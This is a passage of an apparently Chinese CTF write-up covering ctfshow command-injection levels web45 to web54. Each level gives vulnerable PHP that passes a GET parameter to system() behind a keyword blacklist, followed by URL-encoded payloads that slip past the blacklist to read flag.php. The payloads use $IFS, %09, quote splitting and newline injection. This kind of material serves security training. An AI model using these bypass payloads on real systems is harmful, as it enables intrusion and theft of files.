</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了<code>;|cat|flag</code></p>
<p>小问题</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac f*||

...
//记得转url编码
</code></pre><h4 id="web45">web45<a hidden class="anchor" aria-hidden="true" href="#web45">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:35:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| /i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了<code>;|cat|flag</code>和空格</p>
<p>可以用%09或$IFS$9代替空格</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

echo$IFS`tac$IFS*`%0A

...
//记得转url编码
</code></pre><h4 id="web46">web46<a hidden class="anchor" aria-hidden="true" href="#web46">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*/i&#34;, $c)){
        system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);
    }
}else{
    highlight_file(__FILE__);
}
</code></pre><p>过滤有点多啊</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*</p></blockquote>
<p>但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//记得转url编码
</code></pre><h4 id="web47">web47<a hidden class="anchor" aria-hidden="true" href="#web47">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:59:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤这么多O.o？</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail</p></blockquote>
<p>但是幸好我用的是tac</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//记得转url编码
</code></pre><h4 id="web48">web48<a hidden class="anchor" aria-hidden="true" href="#web48">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:06:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤更多了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`</p></blockquote>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
//记得转url编码
</code></pre><h4 id="web49">web49<a hidden class="anchor" aria-hidden="true" href="#web49">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:22:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%</p></blockquote>
<p>虽然过滤了%但是是不影响我们传入的url编码的</p>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
</code></pre><h4 id="web50">web50<a hidden class="anchor" aria-hidden="true" href="#web50">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:32:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\x09|\x26</p></blockquote>
<p>坏，没法用%09代替空格，没法用?代替字符</p>
<p>不过幸好还有&lt;和&rsquo;'</p>
<pre tabindex="0"><code>tac&lt;fla%27%27g.php||
or
tac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51">web51<a hidden class="anchor" aria-hidden="true" href="#web51">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:42:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26/</p></blockquote>
<p>怎么把我tac也过滤了</p>
<p>没事能绕过</p>
<pre tabindex="0"><code>t%27%27ac&lt;fla%27%27g.php||
or
t%27%27ac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51-1">web51<a hidden class="anchor" aria-hidden="true" href="#web51-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:50:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>我测怎么连&lt; &gt;都要过滤</p>
<p>别忘了还可以用$IFS</p>
<pre tabindex="0"><code>ca%27%27t$IFS/fla%27%27g||
or
ca%27%27t$IFS/fla%27%27g%0a
</code></pre><h4 id="web52">web52<a hidden class="anchor" aria-hidden="true" href="#web52">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 18:21:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/</p></blockquote>
<p>这题没有在后面进行命令拼接，其他和上一题一样</p>
<pre tabindex="0"><code>c%27%27at${IFS}fla%27%27g.php
</code></pre><h4 id="web54">web54<a hidden class="anchor" aria-hidden="true" href="#web54">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 19:43:42
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
